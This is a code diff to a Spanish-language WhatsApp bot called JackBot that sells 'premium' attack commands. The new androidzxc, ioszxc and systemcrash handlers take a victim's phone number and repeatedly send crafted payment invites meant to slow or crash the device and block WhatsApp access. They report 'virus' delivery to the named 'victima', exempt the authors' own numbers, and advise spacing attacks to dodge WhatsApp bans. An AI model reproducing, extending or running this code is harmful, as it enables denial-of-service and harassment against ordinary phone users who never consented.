@@ -424,7 +424,7 @@ module.exports = JackBot = async (JackBot, m, msg, chatUpdate, store) => {
 
     if (m.message && m.isGroup) {
       console.log(chalk.cyan(`\n\n/)  /)  ~ ┏━━━━━━━━━━━━━━━━━┓
-( •-• )  ~  CHAT DEL GRUPO 
+( •-• )  ~  𝗖𝗛𝗔𝗧 𝗗𝗘𝗟 𝗚𝗥𝗨𝗣𝗢 
 /づづ ~   ┗━━━━━━━━━━━━━━━━━┛\n\n`));
       console.log(chalk.green(``));
       const dateTime = formatDateTime(new Date());
@@ -437,7 +437,7 @@ module.exports = JackBot = async (JackBot, m, msg, chatUpdate, store) => {
   `);
     } else {
       console.log(chalk.cyan(`\n\n/)  /)  ~ ┏━━━━━━━━━━━━━━━━━┓
-( •-• )  ~   CHAT PERSONAL 
+( •-• )  ~   𝗖𝗛𝗔𝗧 𝗣𝗘𝗥𝗦𝗢𝗡𝗔𝗟 
 /づづ ~   ┗━━━━━━━━━━━━━━━━━┛\n\n`));
       console.log(chalk.green(`CHAT PRIVADO:`));
       const dateTime = formatDateTime(new Date());
@@ -518,21 +518,14 @@ module.exports = JackBot = async (JackBot, m, msg, chatUpdate, store) => {
       }
       //Comando que da informacion sobre los comandos.
       case 'premium': {
-        const premiumCommands = `*Comandos para Android*
+        const premiumCommands = `*Comandos Premiums*
 
-> *androidwsp*
-> Inpide acceso  al whatsapp.
-> *androidsystem*
-> Afecta el rendimiento del sistema operativo Android y a la vez Inpide el acceso a whatsapp.
-> *androidbattery*
-> Afecta la bateria de los sistemas operativos Android y a la vez inpide el acceso a whatsapp.
-
-*Comandos para iOS*
-
-> *ioswsp*
-> Inpide acceso  al whatsapp.
-> *iosbattery*
-> Inpide acceso al whatsapp y a la vez genera un desgaste de la Báteria 400mA.
+> *androidzxc*
+> Este comando ralentiza el dispositivo de la persona afectada, haciendo que el sistema operativo Android comience a fallar gradualmente. La función no solo afecta al dispositivo, sino también al WhatsApp de la persona, negándole el acceso a la aplicación.\n\nLa manera en la que la persona afectada puede recuperar el acceso es eliminando la aplicación WhatsApp o teniendo su cuenta vinculada en WhatsApp Web.
+> *ioszxc*
+> Este comando ralentiza el dispositivo de la persona afectada, haciendo que el sistema operativo iOS comience a fallar gradualmente. La función no solo afecta al dispositivo, sino también al WhatsApp de la persona, negándole el acceso a la aplicación.\n\nLa manera en la que la persona afectada puede recuperar el acceso es eliminando la aplicación WhatsApp o teniendo su cuenta vinculada en WhatsApp Web.
+> *systemcrash*
+> Este comando provoca que el dispositivo Android de la persona afectada colapse, mostrando un mensaje de error del sistema o variables relacionadas, como "System Error". La función afecta tanto al dispositivo como al WhatsApp de la persona, negándole el acceso a la aplicación. Este comando afecta a versiones de Android 10 o inferiores.
 
 ¿Quieres ser parte de la familia? comunícate con el siguiente número.
 *[Click]* https://wa.me/51976254398`;
@@ -543,7 +536,7 @@ module.exports = JackBot = async (JackBot, m, msg, chatUpdate, store) => {
             externalAdReply: {
               showAdAttribution: true,
               title: `¿Quieres ser usuario Premium?`,
-              body: `Comandos solo para usuarios Premium`,
+              body: `Lee lo siguiente ;)`,
               thumbnailUrl: 'https://i.ibb.co/80F70Nm/fonfovip.webp',
               sourceUrl: global.link,
               mediaType: 1,
@@ -614,7 +607,7 @@ module.exports = JackBot = async (JackBot, m, msg, chatUpdate, store) => {
 
 
       //Crash Whatsapp
-      case "androidwsp": {
+      case "androidzxc": {
         if (!isPremium) return sendMessageWithMentions(mess.prem)
         if (!text) return sendMessageWithMentions(`*¡𝙀𝙍𝙍𝙊𝙍!*\n\n𝙀𝙨𝙩𝙖𝙨 𝙪𝙨𝙖𝙣𝙙𝙤 𝙞𝙣𝙘𝙤𝙧𝙧𝙚𝙘𝙩𝙖𝙢𝙚𝙣𝙩𝙚 𝙡𝙖 𝙛𝙪𝙣𝙘𝙞𝙤𝙣..\n\n𝘼𝙦𝙪𝙞 𝙩𝙞𝙚𝙣𝙚𝙨 𝙪𝙣 𝙚𝙟𝙚𝙢𝙥𝙡𝙤:\n${prefix + command} 51999999999,5`)
         let number = text.split(',')[0];
@@ -642,12 +635,47 @@ module.exports = JackBot = async (JackBot, m, msg, chatUpdate, store) => {
         await sleep(2500);
         sendMessageWithMentions(
           "*Virus enviado correctamente.*\n\n*victima* @" + whatsappNumber.split('@')[0] +
-          "\n Comando *" + command + "* ✅\n\n*IMPORTANTE*\n*Utiliza esta funcion cada 3 minutos para que el sistema no sea baneado por wsp.*",
+          "\n Comando *" + command + "* ✅\n\n*IMPORTANTE*\nUtiliza esta funcion cada 3 minutos para que el sistema no sea baneado por wsp.",
           [whatsappNumber]
         );
       }
         break;
-      case "ioswsp": {
+        
+      case "ioszxc": {
+        if (!isPremium) return sendMessageWithMentions(mess.prem)
+        if (!text) return sendMessageWithMentions(`*¡𝙀𝙍𝙍𝙊𝙍!*\n\n𝙀𝙨𝙩𝙖𝙨 𝙪𝙨𝙖𝙣𝙙𝙤 𝙞𝙣𝙘𝙤𝙧𝙧𝙚𝙘𝙩𝙖𝙢𝙚𝙣𝙩𝙚 𝙡𝙖 𝙛𝙪𝙣𝙘𝙞𝙤𝙣..\n\n𝘼𝙦𝙪𝙞 𝙩𝙞𝙚𝙣𝙚𝙨 𝙪𝙣 𝙚𝙟𝙚𝙢𝙥𝙡𝙤:\n${prefix + command} 51999999999,5`)
+        let number = text.split(',')[0];
+        let amount = text.split(',')[1] * 5;
+        if (!number || !amount) {
+          return sendMessageWithMentions(`Estas usando el comando mal...\n\n*Ejemplos:*\n${prefix + command} + número + , + 5\n${prefix + command} 51999999999,5`)
+        }
+        if (isNaN(parseInt(amount))) {
+          return sendMessageWithMentions("Solo numeros individuales, ejemplo 1 - 2 - 3");
+        }
+        let cleanedNumber = number.replace(/[^0-9]/g, '');
+        let encodedAmount = '' + encodeURI(amount);
+        var contactInfo = await JackBot.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
+        let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
+        if (["51929766663", "51976254398", "51919465759", "51933778631"].includes(cleanedNumber)) {
+          // No hacer nada, salir de la función
+          return;
+        }
+        if (contactInfo.length == 0) {
+          return sendMessageWithMentions("El número no está registrado en WhatsApp");
+        }
+        sendMessageWithMentions("virus en process..");
+        await sleep(2000); // Adjusted sleep time for clarity
+        sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
+        await sleep(2500); // Adjusted sleep time for clarity
+        sendMessageWithMentions(
+          "*Virus enviado correctamente.*\n\n*victima* @" + whatsappNumber.split('@')[0] +
+          "\n Comando *" + command + "* ✅\n\n*IMPORTANTE*\nUtiliza esta funcion cada 3 minutos para que el sistema no sea baneado por wsp.",
+          [whatsappNumber]
+        );
+      }
+        break;
+        
+      /*case "iosbattery": {
         if (!isPremium) return sendMessageWithMentions(mess.prem)
         if (!text) return sendMessageWithMentions(`*¡𝙀𝙍𝙍𝙊𝙍!*\n\n𝙀𝙨𝙩𝙖𝙨 𝙪𝙨𝙖𝙣𝙙𝙤 𝙞𝙣𝙘𝙤𝙧𝙧𝙚𝙘𝙩𝙖𝙢𝙚𝙣𝙩𝙚 𝙡𝙖 𝙛𝙪𝙣𝙘𝙞𝙤𝙣..\n\n𝘼𝙦𝙪𝙞 𝙩𝙞𝙚𝙣𝙚𝙨 𝙪𝙣 𝙚𝙟𝙚𝙢𝙥𝙡𝙤:\n${prefix + command} 51999999999,5`)
         let number = text.split(',')[0];
@@ -679,40 +707,7 @@ module.exports = JackBot = async (JackBot, m, msg, chatUpdate, store) => {
           [whatsappNumber]
         );
       }
-        break;
-      case "iosbattery": {
-        if (!isPremium) return sendMessageWithMentions(mess.prem)
-        if (!text) return sendMessageWithMentions(`*¡𝙀𝙍𝙍𝙊𝙍!*\n\n𝙀𝙨𝙩𝙖𝙨 𝙪𝙨𝙖𝙣𝙙𝙤 𝙞𝙣𝙘𝙤𝙧𝙧𝙚𝙘𝙩𝙖𝙢𝙚𝙣𝙩𝙚 𝙡𝙖 𝙛𝙪𝙣𝙘𝙞𝙤𝙣..\n\n𝘼𝙦𝙪𝙞 𝙩𝙞𝙚𝙣𝙚𝙨 𝙪𝙣 𝙚𝙟𝙚𝙢𝙥𝙡𝙤:\n${prefix + command} 51999999999,5`)
-        let number = text.split(',')[0];
-        let amount = text.split(',')[1] * 5;
-        if (!number || !amount) {
-          return sendMessageWithMentions(`Estas usando el comando mal...\n\n*Ejemplos:*\n${prefix + command} + número + , + 5\n${prefix + command} 51999999999,5`)
-        }
-        if (isNaN(parseInt(amount))) {
-          return sendMessageWithMentions("Solo numeros individuales, ejemplo 1 - 2 - 3");
-        }
-        let cleanedNumber = number.replace(/[^0-9]/g, '');
-        let encodedAmount = '' + encodeURI(amount);
-        var contactInfo = await JackBot.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
-        let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-        if (["51929766663", "51976254398", "51919465759", "51933778631"].includes(cleanedNumber)) {
-          // No hacer nada, salir de la función
-          return;
-        }
-        if (contactInfo.length == 0) {
-          return sendMessageWithMentions("El número no está registrado en WhatsApp");
-        }
-        sendMessageWithMentions("virus en process..");
-        await sleep(2000); // Adjusted sleep time for clarity
-        sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
-        await sleep(2500); // Adjusted sleep time for clarity
-        sendMessageWithMentions(
-          "*Virus enviado correctamente.*\n\n*victima* @" + whatsappNumber.split('@')[0] +
-          "\n Comando *" + command + "* ✅\n\n*IMPORTANTE*\n*Utiliza esta funcion cada 3 minutos para que el sistema no sea baneado por wsp.*",
-          [whatsappNumber]
-        );
-      }
-        break;
+        break;*/
 
       case "virus":
         {
@@ -738,7 +733,7 @@ module.exports = JackBot = async (JackBot, m, msg, chatUpdate, store) => {
         }
         break;
 
-      case "gp":
+      /*case "gp":
         {
           if (!isPremium) return sendMessageWithMentions(mess.prem)
           if (!text) {
@@ -761,8 +756,8 @@ module.exports = JackBot = async (JackBot, m, msg, chatUpdate, store) => {
             sendMessageWithMentions(util.format(error));
           }
         }
-        break;
-      case "androidsystem": {
+        break;*/
+      case "systemcrash": {
         if (!isPremium) return sendMessageWithMentions(mess.prem)
         if (!text) return sendMessageWithMentions(`*¡𝙀𝙍𝙍𝙊𝙍!*\n\n𝙀𝙨𝙩𝙖𝙨 𝙪𝙨𝙖𝙣𝙙𝙤 𝙞𝙣𝙘𝙤𝙧𝙧𝙚𝙘𝙩𝙖𝙢𝙚𝙣𝙩𝙚 𝙡𝙖 𝙛𝙪𝙣𝙘𝙞𝙤𝙣..\n\n𝘼𝙦𝙪𝙞 𝙩𝙞𝙚𝙣𝙚𝙨 𝙪𝙣 𝙚𝙟𝙚𝙢𝙥𝙡𝙤:\n${prefix + command} 51999999999,5`)
         let number = text.split(',')[0];
@@ -790,12 +785,13 @@ module.exports = JackBot = async (JackBot, m, msg, chatUpdate, store) => {
         await sleep(2500); // Adjusted sleep time for clarity
         sendMessageWithMentions(
           "*Virus enviado correctamente.*\n\n*victima* @" + whatsappNumber.split('@')[0] +
-          "\n Comando *" + command + "* ✅\n\n*IMPORTANTE*\n*Utiliza esta funcion cada 3 minutos para que el sistema no sea baneado por wsp.*",
+          "\n Comando *" + command + "* ✅\n\n*IMPORTANTE*\nUtiliza esta funcion cada 3 minutos para que el sistema no sea baneado por wsp.",
           [whatsappNumber]
         );
       }
         break;
-      case "androidbattery": {
+        
+      /*case "androidbattery": {
         if (!isPremium) return sendMessageWithMentions(mess.prem)
         if (!text) return sendMessageWithMentions(`*¡𝙀𝙍𝙍𝙊𝙍!*\n\n𝙀𝙨𝙩𝙖𝙨 𝙪𝙨𝙖𝙣𝙙𝙤 𝙞𝙣𝙘𝙤𝙧𝙧𝙚𝙘𝙩𝙖𝙢𝙚𝙣𝙩𝙚 𝙡𝙖 𝙛𝙪𝙣𝙘𝙞𝙤𝙣..\n\n𝘼𝙦𝙪𝙞 𝙩𝙞𝙚𝙣𝙚𝙨 𝙪𝙣 𝙚𝙟𝙚𝙢𝙥𝙡𝙤:\n${prefix + command} 51999999999,5`)
         let number = text.split(',')[0];
@@ -827,10 +823,10 @@ module.exports = JackBot = async (JackBot, m, msg, chatUpdate, store) => {
           [whatsappNumber]
         );
       }
-        break;
+        break;*/
 
       case 'pin': case 'pintesert': {
-        if (!text) return sendMessageWithMentions(`ingresa nombre de la imagen\n\nEjemplo:\n\n.pin Luffy`)
+        if (!text) return sendMessageWithMentions(`Ingresa nombre de la imagen\n\nEjemplo:\n\n${prefix + command} Gatito`)
         let { pinterest } = require('./lib/scraper')
         anu = await pinterest(text)
         result = anu[Math.floor(Math.random() * anu.length)]
@@ -850,27 +846,20 @@ module.exports = JackBot = async (JackBot, m, msg, chatUpdate, store) => {
 *⚝* _¡Welcome! Aquí están los comandos de mi proyecto, Espero sea de tu agrado :)_
 ${readmore}
 
-╰┈➤ *virus ᴀɴᴅʀᴏɪᴅ* - Premium
-> ${prefix}androidwsp
-> ${prefix}androidsystem
-> ${prefix}androidbattery
+╰┈➤ *ᴄᴏᴍᴀɴᴅᴏꜱ ᴘʀᴇᴍɪᴜᴍꜱ* - ᴘʀᴇᴍɪᴜᴍ
+> ${prefix}androidzxc
+> ${prefix}systemcrash
+> ${prefix}ioszxc
 
-╰┈➤ *virus ɪᴏꜱ* - Premium 
-> ${prefix}ioswsp
-> ${prefix}iosbattery
-
-╰┈➤ *virus para grupos* - Premium
-> ${prefix}gp
-
-╰┈➤ *Comandos Free* - Gratis
+╰┈➤ *ᴄᴏᴍᴀɴᴅᴏꜱ ɢʀᴀᴛɪꜱ* - ɢʀᴀᴛɪꜱ
 > ${prefix}s
 > ${prefix}pin
 > ${prefix}toimg
 
-╰┈➤ *info cmd vip*
+╰┈➤ *ɪɴꜰᴏ ᴄᴏᴍᴀɴᴅᴏꜱ ᴘʀᴇᴍɪᴜᴍ*
 > ${prefix}premium
 
-╰┈➤ *ᴅᴜᴇñᴏ*
+╰┈➤ *ᴄᴏɴᴛᴀᴄᴛᴀʀ ᴄᴏɴ ᴇʟ ᴄʀᴇᴀᴅᴏʀ*
 > ${prefix}owner
 
 ╰┈➤ *Jack Bot*
